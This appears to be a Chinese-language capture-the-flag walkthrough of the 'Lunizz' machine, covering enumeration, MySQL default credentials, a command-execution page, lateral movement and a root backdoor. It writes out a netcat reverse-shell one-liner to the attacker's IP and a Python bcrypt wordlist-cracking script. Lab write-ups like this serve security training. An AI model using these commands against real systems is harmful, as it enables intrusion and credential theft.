# Lunizz CTF

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/004b70c7ef224adab1aa1776900466df.png)

## Web枚举

进80，apache默认页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/c095f048eff84ca3baabfcb2a354630d.png)

gobuster扫一下目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/e664b053cc77493d82468606f75fa4a1.png)

/hidden一个文件上传点, 图片上传后无权访问/hidden/uploads/

![在这里插入图片描述](https://img-blog.csdnimg.cn/c85ff7d957554b088244e043efcf574c.png)

/whatever一个假的命令执行点

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb953fdb2460423b9aa87f3c38a9eb12.png)

/instructions.txt

	由 CTF_SCRIPTS_CAVE 制作（不是真实的）
	
	感谢您安装我们的 ctf 脚本
	
	＃脚步
	- 创建一个 mysql 用户 (runcheck:CTF_*****************me)
	- 更改 config.php 文件的必要行
	
	完成后就可以开始使用 ctf 脚本了
	
	＃笔记
	请不要使用默认凭据（这很危险）<<<<<<<<<------------------------ 阅读此行 请

得到了一组mysql默认凭据，我相信他会使用默认凭据的，尝试登录mysql

![在这里插入图片描述](https://img-blog.csdnimg.cn/96f202707fd045b68925abeac0586821.png)

里面有个runornot的库

![在这里插入图片描述](https://img-blog.csdnimg.cn/19e4b8b2ab864acdb2ab5ec93be90655.png)

除了这些，已经没有其他东西了，也无法读写文件

我注意到房间提起刚刚的假命令执行点，

从runcheck表当中的run字段，根据多年的编程经验，它可能就是一个开关，用于激活命令执行点

	update runcheck set run=1;

![在这里插入图片描述](https://img-blog.csdnimg.cn/03983dac807b4a5d91b6f2ccc6fc5f6d.png)

成功执行命令，猜测没错

![在这里插入图片描述](https://img-blog.csdnimg.cn/c496637e99f44bed8a3474b744fa4e1a.png)

直接reverse shell payload

```bash
mkfifo /tmp/f1;nc 10.14.39.48 8888 < /tmp/f1 | /bin/bash > /tmp/f1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/7ba1ac8c4f75482b948cb7400901cc62.png)

## 横向移动 - 1

在根目录发现了adam用户的文件夹proct，里面有个python文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/8ec27e43440f417cafb7d680b65f32ec.png)

查看该文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/ef47b349f9564ff5aa67c02f3870c8ba.png)

我尝试着爆破，但没成功，发现它加了随机的salt，而下面给出了整个hash，并且包含了那个salt，即前22位，我们可以用rockyou加salt来爆破出明文密码

值得注意的是我们还需要进行base64 encode

```python
import bcrypt
import base64


salt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.'
hashs = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'

with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
    passwd_list = f.readlines()

for pwd in passwd_list:
    passwd = pwd.strip()
    b64_pwd = base64.b64encode(passwd.encode('ascii'))
    generated_hash = bcrypt.hashpw(b64_pwd, salt)
    print(f'Cracking...: {passwd}', end='\r')

    if generated_hash == hashs:
        print(f'\n{passwd}')
        break
```

爆出来

![在这里插入图片描述](https://img-blog.csdnimg.cn/3bcbc2c5d5804533abc7088c85a96886.png)

直接su过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/a023f38ebe2e4444a143aba637408903.png)

## 横向移动 - 2

在adam家目录下的Dekstop里面有个txt

![在这里插入图片描述](https://img-blog.csdnimg.cn/65fb9c8891434c028a4559064db6c4eb.png)

打开它，地图所在的位置名字，尝试一番后，将其小写并且去掉空格就是mason的密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/87618867e98a47938fbc73c44692a0cd.png)

user flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/062af0eb24e44b6f9a0059c363576a7a.png)

## 权限提升

通过ss -tlnp发现内网开了个8080，使用ps查看进程是php并且是root

![在这里插入图片描述](https://img-blog.csdnimg.cn/249083f559444e2298ae06b8154bd19f.png)

直接传个socat过去把它转出来

![在这里插入图片描述](https://img-blog.csdnimg.cn/59ae61da4ab447c5b990cb698e804a2a.png)

访问8888端口, 一个backdoor

![在这里插入图片描述](https://img-blog.csdnimg.cn/4d3f2202656c49b1a4eb3ede168eb05d.png)

使用mason的密码，并且使用passwd的cmdtype进行post请求，发现它似乎直接更改了root的密码为mason的密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/79f1e709f2dc455a93069f9b191f346f.png)

直接su到root，同时拿到root flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/9da07e6525094de38d96208aea7c7ba9.png)
